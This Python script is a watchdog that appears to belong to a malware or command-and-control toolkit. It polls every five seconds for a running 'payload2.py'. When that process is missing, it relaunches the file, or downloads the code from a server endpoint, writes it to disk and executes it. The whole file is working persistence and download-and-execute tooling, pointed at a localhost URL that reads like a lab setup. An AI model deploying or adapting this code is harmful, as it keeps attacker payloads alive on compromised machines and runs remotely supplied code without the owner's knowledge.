import os
import sys
import time
import subprocess
import requests
import psutil

CLIENT_FILENAME = "payload2.py"
SERVER_URL = "http://127.0.0.1:5000/get_client_code"
CHECK_INTERVAL = 5

def is_client_running():
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            if 'python' in proc.info['name'].lower() and CLIENT_FILENAME in ' '.join(proc.info['cmdline']):
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return False

def find_client_code():
    script_path = os.path.join(os.getcwd(), CLIENT_FILENAME)
    if os.path.isfile(script_path):
        return script_path
    return None

def download_client_code():
    try:
        response = requests.get(SERVER_URL)
        if response.status_code == 200:
            return response.text
        else:
            print(f"[!] Failed to download client code: {response.status_code}")
            return None
    except Exception as e:
        print(f"[!] Error downloading client code: {e}")
        return None

def save_client_code(code, path):
    with open(path, "w", encoding="utf-8") as f:
        f.write(code)

def launch_client(script_path):
    print(f"[+] Launching client: {script_path}")
    subprocess.Popen([sys.executable, script_path])

def main():
    print("[*] Watchdog started.")
    while True:
        if is_client_running():
            print("[*] Client is running. Sleeping.")
            time.sleep(CHECK_INTERVAL)
            continue

        print("[!] Client is NOT running.")
        client_path = find_client_code()
        if client_path:
            print("[*] Client code found. Launching.")
            launch_client(client_path)
        else:
            print("[*] Client code not found. Requesting from server.")
            code = download_client_code()
            if code:
                save_client_code(code, CLIENT_FILENAME)
                print("[*] Client code saved. Launching.")
                launch_client(CLIENT_FILENAME)
            else:
                print("[!] Could not retrieve client code. Will retry.")
        time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    main()